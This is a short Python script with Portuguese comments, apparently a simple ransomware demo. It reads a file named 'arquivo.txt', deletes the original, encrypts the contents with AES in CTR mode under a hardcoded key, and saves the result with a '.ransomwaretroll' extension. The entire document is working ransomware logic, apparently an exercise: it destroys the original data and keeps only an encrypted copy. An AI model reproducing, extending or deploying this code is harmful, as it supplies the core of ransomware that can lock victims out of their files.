import os
import pyaes

file_name = "arquivo.txt"

# Leitura do arquivo original
with open(file_name, "rb") as file:
    file_data = file.read()

# Remoção do arquivo original
os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografia dos dados do arquivo
crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransomwaretroll"

# Criação do novo arquivo criptografado
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)